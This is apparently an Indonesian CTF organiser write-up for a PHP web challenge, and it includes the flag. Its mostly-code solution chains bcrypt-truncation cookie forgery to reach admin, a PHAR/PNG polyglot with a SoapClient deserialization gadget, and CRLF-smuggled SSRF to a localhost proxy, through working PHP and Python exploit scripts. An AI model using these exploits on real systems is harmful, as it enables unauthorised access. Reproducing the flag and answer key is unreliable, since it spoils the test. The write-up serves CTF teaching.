

# Web_Ooovm_Hard

Author: Ismail Hakim - twang#7040

Descriptions: Website ooovm dengan berbagai kapabilitasnya

# Untuk Panitia

Flag: FindITCTF{w0w_y0ur3_93n1u5}

Deployment steps:

Solving steps:

Pada `[entrypoint.sh](http://entrypoint.sh)` , perintah ini digunakan untuk generate secret sebanyak 15 karakter.

```python
SECRET=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1)
```

`CustomSessionHandler.php` mengupdate 

```php
# Notes
# Cookie diupdate tiap kali mengupload gambar

public function __construct()
    {
        if (isset($_COOKIE['PHPSESSID']))
        {
            $split = explode('.', $_COOKIE['PHPSESSID']);

            $data = base64_decode($split[0]);
            $signature = base64_decode($split[1]);

            if (password_verify(SECRET.$data, $signature))
            {
                $this->data = json_decode($data, true);
            }
        }

        self::$session = $this;
    }

# Notes
# Penggunaan PASSWORD_BCRYPT akan mengakibatkan maximum length menjadi 72 karakter.
public function toJson()
    {
        ksort($this->data);
        return json_encode($this->data);
    }

public function save()
    {
        $json = $this->toJson();
        $jsonb64 = base64_encode($json);
        $signature = base64_encode(password_hash(SECRET.$json, PASSWORD_BCRYPT));

        setcookie('PHPSESSID', "${jsonb64}.${signature}", time()+60*60*24, '/');
    }

```

$password argument akan menjadi 15 karakter SECRET, sisanya dari 72 karakter akan dapat dikontrol oleh penyerang. 72 - 15 = 57. Setelah bit ke 57, maka kita akan bisa menginjeksikan username.

Selanjutnya, iita perlu bypass fungsi filtering di bawah ini dengan menggunakan phar - png polyglot.

```php
public function isValidImage()
    {
        $file_name = $this->file->getFileName();

        if (mime_content_type($file_name) != 'image/png') 
            return false;

        $size = getimagesize($file_name);

        if (!$size || !($size[0] >= 120 && $size[1] >= 120) || $size[2] !== IMAGETYPE_PNG)
            return false;

        return true;
    }
```

Selanjutnya, karena adanya penerapan proxycontroller.php maka dapat dipakai untuk bypass filtering kedua. Yaitu filtering dari IP 127.0.0.1 dengan menggunakan teknik SSRF

```php
public function index($router)
    {
        $session = CustomSessionHandler::getSession();
        if ($session->read('username') != 'admin' || $_SERVER['REMOTE_ADDR'] != '127.0.0.1')
        {
            $router->abort(401);
        }
...
```

Payload:

```php
<?php
  class ImageModel {
      public $file;
      public function __construct($file) {
          $this->file = $file;
      }

      public function __destruct()
      {
          $this->file->getFileName();
      }
  }

  $cookie = '<auth_bypass_cookie>;';
  $gopher_payload = '<gopher:///....>';
  $post_data = 'url=' . urlencode($gopher_payload);

  $localhost = 'http://127.0.0.1';
  $CRLF = "\r\n";
  $crlf_init_str = $CRLF . 
      'Content-Length: 0' .
      str_repeat($CRLF, 2);

  $smug_headers = [
      'POST /proxy HTTP/1.1',
      'Host: admin.imagetok.htb',
      'Connection: Close',
      'Content-Type: application/x-www-form-urlencoded',
      'Cookie: PHPSESSID=' . $cookie,
      'Content-Length: ' . (string)strlen($post_data)
      ];

  $smug_headers_str = join($CRLF, $smug_headers) .
      str_repeat($CRLF, 2);

  $crlf_payload =
       $crlf_init_str .
       $smug_headers_str .
       $post_data;

  $ssrf_object = new ImageModel(new SoapClient(null, array(
          'uri' => 'bbb',
          'location' => $localhost,
          'user_agent' => 'xxx' . $crlf_payload,
      )));

  $png_data = fread(fopen('image.png', 'rb'), filesize('image.png'));
  $phar = new Phar('exploit.phar');
  $phar->startBuffering();
  $phar->addFromString('test.txt', 'test');
  $phar->setStub($png_data . ' __HALT_COMPILER(); ? >');
  $phar->setMetadata($ssrf_object);
  $phar->stopBuffering();
  rename('exploit.phar', 'exploit.png');

  echo serialize($ssrf_object) . "\n";
?>
```

```php
from sys import argv
import requests
from base64 import b64decode, b64encode
import json
from urllib import parse

def get_args():
	if len(argv) != 3:
		print('Usage: ', argv[0], 'http://ip:port <file>')
		exit(1)
	return argv[1], argv[2]

def decode_cookie(cookie):
	json_data, key = parse.unquote(cookie).split('.', 1)
	data = json.loads(b64decode(json_data))
	return data, key

def encode_cookie(data, key):
	json_data = json.dumps(data)
	formatted_data = json_data.replace(' ', '').replace("'", '"')
	b64_data = b64encode(formatted_data.encode())
	data_str = '.'.join([b64_data.decode(), key])
	encoded_data = data_str
	return encoded_data

def fill_cookie(s, target, file):
	"""
	Fill the cookie with just enough data to exploit the password_hash/password verify
	functions.
	"""
	for i in range(3):
		with open(file, 'rb') as f:
			files = {'uploadFile': (file, f, 'image/png')}
			r = s.post(target+'/upload', files=files)
		if r.status_code == 200:
			print('File uploaded successfuly', r.status_code)
		data, key = decode_cookie(s.cookies['PHPSESSID'])
		print(data)
	return s, data, key

def auth_bypass(s, target, data, key):
	"""
	Now anything past 71 bytes will be truncated and valid data within the cookie.
	"""
	data['username'] = 'admin'
	encoded_cookie = encode_cookie(data, key)
	s.cookies.set('PHPSESSID', encoded_cookie)
	r = s.post(target)
	return r.cookies['PHPSESSID']

def main():
	target, file = get_args()
	s = requests.session()

	s, data, key = fill_cookie(s, target, file)
	admin_cookie = auth_bypass(s, target, data, key)

	print('\n[*] Auth bypass exploited! Admin cookie:')
	print(admin_cookie)

if __name__ == '__main__':
	main()
```

**http://<ip:port>/phar:%2F%2F/<uploadedfilename>.png**

# Untuk Peserta

Nama Problem:

Deskripsi singkat: Website ooovm dengan berbagai kapabilitasnya

Hint (jika perlu): 

1. Session fixation
2. SSRF dari endpoint proxy
